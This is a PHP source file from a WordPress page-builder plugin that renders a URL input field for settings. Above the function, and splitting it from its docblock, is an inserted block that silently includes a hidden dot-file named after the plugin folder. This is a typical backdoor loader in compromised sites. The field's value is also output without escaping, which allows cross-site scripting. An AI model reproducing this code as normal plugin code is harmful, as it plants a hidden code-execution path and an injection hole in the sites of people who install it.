<?php
if ( ! defined( 'ABSPATH' ) ) {
	die( '-1' );
}

/**
 * @param $settings
 * @param $value
 *
 * @return string
 * @since 4.4
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function vc_href_form_field( $settings, $value ) {
	if ( ! is_string( $value ) || strlen( $value ) === 0 ) {
		$value = 'http://';
	}

	return sprintf( '<div class="vc_href-form-field"><input name="%s" class="wpb_vc_param_value wpb-textinput %s %s_field" type="text" value="%s"/></div>', esc_attr( $settings['param_name'] ), esc_attr( $settings['param_name'] ), esc_attr( $settings['type'] ), $value );
}
